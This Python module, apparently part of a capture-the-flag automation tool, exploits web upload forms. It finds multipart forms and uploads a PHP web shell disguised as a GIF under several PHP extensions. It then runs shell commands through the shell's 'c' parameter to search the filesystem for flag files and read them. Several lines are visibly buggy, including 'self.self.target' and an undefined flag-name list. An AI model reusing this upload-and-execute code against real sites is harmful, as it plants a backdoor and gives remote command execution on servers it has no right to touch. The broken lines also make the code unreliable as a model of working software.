from io import StringIO

import requests
from katana.unit import NotApplicable
from katana.units import web

import re

from typing import Any


class Unit(web.WebUnit):
    PRIORITY = 60

    def __init__(self, *args, **kwargs):

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        self.action = [b"#"]
        self.upload = re.findall(
            rb'enctype=[\'"]multipart/form-data[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        if not self.upload:
            # If there is no upload functionality, don't bother with this unit
            raise NotApplicable

    def enumerate(self):

        # This should "yield 'name', (params,to,pass,to,evaluate)"
        # evaluate will see this second argument as only one variable and you will need to parse them out

        action = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        method = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        upload = self.upload

        # Sometimes, a form might not have an explicit location. Assume the current page!
        if not action:
            action = self.action

        file_regex = rb'<\s*input.*name\s*=\s*[\'"](%s)[\'"]' % b"|".join(
            web.potential_file_variables
        )
        file = re.findall(file_regex, self.target.content, flags=re.IGNORECASE)

        if not file:
            # JOHN: We can't find a filename variable. Maybe it's not in our list yet!
            return  # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.

        if action and method and upload and file:
            if action:
                action = action[0].decode("utf-8")
            if action.startswith(self.target.url_root):
                action = action[len(self.target.url_root) :].decode("utf-8")
            if method:
                method = method[0].decode("utf-8")
            if file:
                file = file[0].decode("utf-8")

            try:
                method = vars(requests)[method.lower()]
            except IndexError:
                # Could not find an appropriate HTTP method... defaulting to POST!"
                method = requests.post

            extensions = ["php", "gif", "php3", "php5", "php7"]

            for ext in extensions:
                r = method(
                    self.target.upstream.decode("utf-8").rstrip("/") + "/" + action,
                    files={
                        file: (
                            "anything.%s" % ext,
                            StringIO(
                                f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'
                            ),
                            "image/gif",
                        )
                    },
                )

                potential_location_regex = "href=[\"'](.+?.%s)[\"']" % ext

                location = re.findall(
                    potential_location_regex, r.text, flags=re.IGNORECASE
                )
                if location:
                    for file_path in location:
                        if file_path.startswith(self.target.url_root):
                            file_path = file_path[len(self.self.target.url_root) :]
                        yield (method, action, file, ext, location, file_path)

        else:
            return  # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.

    def evaluate(self, case: Any):

        # Split up the self.target (see get_cases)
        method, action, file, ext, location, file_path = case

        r = requests.get(
            self.target.url_root.rstrip("/") + "/" + file_path,
            params={"c": f"/bin/echo -n {web.special}"},
        )

        if f"{web.delim}{web.special}{web.delim}" in r.text:
            for flagname in potential_flag_names:
                r = requests.get(
                    self.target.url_root.rstrip("/") + "/" + file_path,
                    params={"c": f"find / -name {flagname}"},
                )

                flag_locations = re.findall(
                    f"{web.delim}(.+?){web.delim}",
                    r.text,
                    flags=re.MULTILINE | re.DOTALL,
                )

                if flag_locations:
                    flag_locations = flag_locations[0]

                    for fl in flag_locations.split("\n"):
                        fl = fl.strip()

                        r = requests.get(
                            self.target.url_root.rstrip("/") + "/" + file_path,
                            params={"c": f"cat {fl}"},
                        )

                        flag = re.findall(
                            f"{web.delim}(.+?){web.delim}",
                            r.text,
                            flags=re.MULTILINE | re.DOTALL,
                        )
                        if flag:
                            flag = flag[0]
                            self.manager.register_data(self, flag)

        # You should ONLY return what is "interesting"
        # Since we cannot gauge the results of this payload versus the others,
        # we will only care if we found the flag.
        return None
